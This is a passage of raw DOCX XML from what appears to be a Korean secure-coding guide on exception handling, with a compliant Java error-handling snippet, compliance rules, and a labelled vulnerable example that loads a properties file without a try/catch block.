                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>오류</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>발생</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">", e);  // </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>상세</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>정보는</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>서버</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>로그에</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    response.getWriter().write("</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>일시적인</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>오류가</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>발생했습니다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">. </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>관리자에게</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>문의하세요</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>.");</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>}</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B30C6E"/>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
      <w:pPr>
        <w:pStyle w:val="21"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">  2. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>오류</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>상황</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>대응</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>부재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9122"/>
      </w:tblGrid>
      <w:tr w:rsidR="00B30C6E">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFF2CC"/>
          </w:tcPr>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="1F3564"/>
                <w:sz w:val="18"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="1F3564"/>
                <w:sz w:val="18"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>준수사항</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="1F3564"/>
                <w:sz w:val="18"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>]</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:ind w:left="170"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t xml:space="preserve">• </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>오류가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발생할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수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있는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코드에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반드시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예외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처리를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적용한다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:ind w:left="170"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">• </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>예외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처리를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생략하면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시스템이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비정상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상태로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계속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동작할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수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있다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B30C6E">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pP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9122"/>
      </w:tblGrid>
      <w:tr w:rsidR="00B30C6E">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FCE4D6"/>
          </w:tcPr>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>취약한</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>코드</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>예</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>]</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>// [</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>취약</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">] </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>예외</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>처리</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>없음</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> → </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>예외</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>발생</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>시</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>이후</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>로직</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>비정상</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>동작</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>FileInputStream fis = new FileInputStream("config.properties");</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>properties.load(fis);</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>fis.close();</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="002B1872">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFF2CC"/>
          </w:tcPr>
          <w:p w:rsidR="002B1872" w:rsidRDefault="00913677">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="C00000"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="C00000"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>위험</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="C00000"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">] </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>파일</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>열기</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>실패</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>시</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>예외를</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>무시하고</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>계속</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>진행하면</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>이후</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>코드에서</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>초기화되지</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>않은</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>상태로</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>동작합니다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">. null </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>참조</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">, </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>잘못된</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>데이터</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>처리</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">, </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>불완전한</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>트랜잭션</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>커밋</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>등이</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>발생하여</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>데이터</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>오염</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>·</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>결제</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
